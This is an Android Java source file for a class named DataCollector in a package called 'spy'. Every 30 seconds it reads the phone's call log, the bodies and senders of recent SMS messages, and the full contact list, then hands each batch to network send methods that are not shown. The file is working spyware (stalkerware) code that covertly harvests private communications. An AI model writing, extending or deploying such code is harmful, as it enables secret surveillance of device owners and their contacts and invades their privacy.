package com.gauravhanna.spy;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class DataCollector {
    private static ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();

    public static void scheduleDataCollection(Context context) {
        executor.scheduleAtFixedRate(() -> {
            collectAndSendCalls(context);
            collectAndSendSMS(context);
            collectAndSendContacts(context);
            // others...
        }, 0, 30, TimeUnit.SECONDS);
    }

    private static void collectAndSendCalls(Context context) {
        List<CallLogEntry> calls = getCallLogs(context.getContentResolver());
        if (!calls.isEmpty()) {
            NetworkHelper.sendCalls(context, calls);
        }
    }

    private static List<CallLogEntry> getCallLogs(ContentResolver resolver) {
        List<CallLogEntry> list = new ArrayList<>();
        String[] projection = {CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE};
        Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                CallLogEntry entry = new CallLogEntry();
                entry.phoneNumber = cursor.getString(0);
                entry.contactName = cursor.getString(1);
                entry.callType = cursor.getInt(2);
                entry.duration = cursor.getInt(3);
                entry.timestamp = cursor.getLong(4);
                list.add(entry);
            }
            cursor.close();
        }
        return list;
    }

    private static void collectAndSendSMS(Context context) {
        List<SmsEntry> smsList = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 50");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                SmsEntry sms = new SmsEntry();
                sms.address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                sms.body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                sms.timestamp = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                sms.type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                smsList.add(sms);
            }
            cursor.close();
        }
        if (!smsList.isEmpty()) {
            NetworkHelper.sendSMS(context, smsList);
        }
    }

    private static void collectAndSendContacts(Context context) {
        List<ContactEntry> contacts = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                ContactEntry contact = new ContactEntry();
                contact.name = name;
                // Get phone number
                Cursor phoneCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null);
                if (phoneCursor != null && phoneCursor.moveToFirst()) {
                    contact.number = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    phoneCursor.close();
                }
                contacts.add(contact);
            }
            cursor.close();
        }
        if (!contacts.isEmpty()) {
            NetworkHelper.sendContacts(context, contacts);
        }
    }

    // Helper classes
    static class CallLogEntry {
        String phoneNumber, contactName;
        int callType, duration;
        long timestamp;
    }
    static class SmsEntry {
        String address, body;
        int type;
        long timestamp;
    }
    static class ContactEntry {
        String name, number;
    }
}